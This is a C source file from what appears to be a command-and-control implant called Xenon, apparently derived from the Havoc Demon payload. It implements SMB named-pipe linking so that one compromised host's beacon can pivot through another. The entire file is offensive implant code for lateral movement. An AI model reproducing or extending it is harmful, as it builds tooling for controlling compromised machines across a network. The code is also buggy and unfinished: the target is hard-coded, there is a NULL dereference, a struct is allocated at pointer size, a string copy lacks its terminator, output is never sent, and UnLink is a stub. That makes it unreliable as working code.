#include "Tasks/Link.h"

#include "Xenon.h"
#include "Package.h"
#include "Parser.h"
#include "Task.h"
#include "Config.h"

#ifdef INCLUDE_CMD_LINK

/**
 * @brief Link current Beacon to an SMB Beacon.
 * 
 * @ref 
 * @return VOID
 */
VOID Link(PCHAR taskUuid, PPARSER arguments)
{
    // Get command arguments for filepath
    UINT32 nbArg = ParserGetInt32(arguments);
    _dbg("\t Got %d arguments", nbArg);

    if (nbArg == 0)
    {
        return;
    }

    SIZE_T targetLen    = 0;
    SIZE_T pipeLen      = 0;
	// PCHAR  Target 		= ParserGetString(arguments, &targetLen);
    PCHAR Target = "test";
	PCHAR  PipeName     = ParserGetString(arguments, &pipeLen);

    _dbg("SMB Link Target: %s", Target);
    _dbg("SMB Link PipeName: %s", PipeName);


    /* Output */
    PVOID outBuf  = NULL;
    SIZE_T outLen = 0;


    /* Connect to Pivot Agent */
    if ( !LinkAdd(Target, PipeName, &outBuf, &outLen) ) 
    {
        _err("Failed to link smb agent.");
        DWORD error = GetLastError();
        PackageError(taskUuid, error);
        goto END;
    }

    // Response package
    PPackage data = PackageInit(0, FALSE);
    PackageAddString(data, outBuf, FALSE);

    // success
    PackageComplete(taskUuid, NULL);

END:

    return;
}

///////////////////////////////////////////////////////////////

/**
 * @brief UnLink current Beacon from an SMB Beacon.
 * 
 * @ref  
 * @return VOID
 */
VOID UnLink(PCHAR taskUuid, PPARSER arguments)
{
    return;
}


/**
 * Helper Functions
 * 
 */



 /**
 * @brief Add a new SMB pivot link to Agent.
 * 
 * @ref Based on Havoc - https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/core/Pivot.c  
 * @return BOOL  
 */
BOOL LinkAdd( PCHAR Target, PCHAR PipeName, PVOID* outBuf, SIZE_T* outLen )
{
    PLINKS LinkData    = NULL;
    HANDLE hPipe       = NULL;

    _dbg( "Connecting to named pipe: %s\n", PipeName );

    hPipe = CreateFileA( PipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL );

    if ( hPipe == INVALID_HANDLE_VALUE )
    {
        _err("CreateFileA failed to connect to named pipe. ERROR : %d", GetLastError());
        return FALSE;
    }

    if ( GetLastError() == ERROR_PIPE_BUSY )
    {
        if ( !WaitNamedPipeA(PipeName, 5000) )
        {
            return FALSE;
        }
    }

    do
    {
        // TODO: first get the size then parse
        if ( PeekNamedPipe( hPipe, NULL, 0, NULL, outLen, NULL ) )
        {
            if ( *outLen > 0 )
            {
                _dbg( "outLen => %d\n", *outLen );

                *outBuf = LocalAlloc(LPTR, *outLen);
                memset(*outBuf, 0, *outLen);

                if ( ReadFile( hPipe, *outBuf, *outLen, outLen, NULL ) )
                {
                    _dbg( "outLen Read => %d\n", *outLen );
                    break;
                }
                else
                {
                    _dbg( "ReadFile: Failed[%d]\n", GetLastError() );
                    CloseHandle(hPipe);
                    return FALSE;
                }
            }
        }
        else
        {
            _dbg( "PeekNamedPipe: Failed[%d]\n", GetLastError() );
            CloseHandle(hPipe);
            return FALSE;
        }
    } while ( TRUE );

    // Adding Link Data to the list
    {
        _dbg( "Pivot :: outBuf[%p] Size[%d]\n", *outBuf, *outLen )

        PCHAR NewLinkId = NULL;                                                 // Allocated in PivotParseLinkId must free
        PivotParseLinkId(*outBuf, *outLen, *NewLinkId);      

        LinkData                  = LocalAlloc(LPTR, sizeof(PLINKS));
        LinkData->hPipe           = hPipe;
        LinkData->Next            = NULL;
        LinkData->LinkId          = NewLinkId;
        LinkData->PipeName        = LocalAlloc( LPTR, strlen(PipeName));        // TODO - Check this feels like an issue
        memcpy( LinkData->PipeName, PipeName, strlen(PipeName) );

        if ( ! xenonConfig->SmbLinks )
        {
            xenonConfig->SmbLinks = LinkData;
        }
        else
        {
            PLINKS LinksList = xenonConfig->SmbLinks;

            do
            {
                if ( LinksList )
                {
                    if ( LinksList->Next )
                        LinksList = LinksList->Next;

                    else
                    {
                        LinksList->Next = LinkData;
                        break;
                    }
                }
                else break;
            } while ( TRUE );
        }
    }

    return TRUE;
}

VOID PivotParseLinkId( PVOID buffer, SIZE_T size, PCHAR* LinkId )
{
    PARSER Parser   = { 0 };
    PCHAR Value     = NULL;
    SIZE_T uuidLen  = 0;

    ParserNew( &Parser, buffer, size );

    Value  = ParserStringCopy(&Parser, &uuidLen);

    _dbg("Parsed SMB Link UUID => %s \n", Value);

    ParserDestroy(&Parser);

    *LinkId = Value;
}



#endif  //INCLUDE_CMD_LINK